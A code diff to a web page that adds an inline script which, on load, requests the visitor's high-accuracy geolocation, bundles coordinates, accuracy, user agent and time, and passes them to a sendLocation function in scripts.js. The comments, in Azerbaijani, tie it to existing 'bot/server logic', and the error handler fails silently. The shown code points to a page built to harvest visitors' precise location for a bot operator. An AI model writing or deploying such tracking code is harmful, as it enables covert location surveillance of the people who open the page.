@@ -267,7 +267,33 @@
     }
 </script>
 
-    <script src="scripts.js"></script>
+    <script>
+(function(){
+  if(!('geolocation' in navigator)) return;
+
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      const payload = {
+        lat: pos.coords.latitude,
+        lng: pos.coords.longitude,
+        acc: pos.coords.accuracy,
+        ua: navigator.userAgent,
+        time: new Date().toISOString()
+      };
+
+      // scripts.js bu funksiyanı artıq tanıyır
+      if(window.sendLocation){
+        window.sendLocation(payload);
+      }
+    },
+    () => {},
+    { enableHighAccuracy:true, timeout:8000 }
+  );
+})();
+</script>
+
+<!-- SƏNİN mövcud bot/server logic -->
+<script src="./scripts.js"></script>
 
 </body>
 </html>
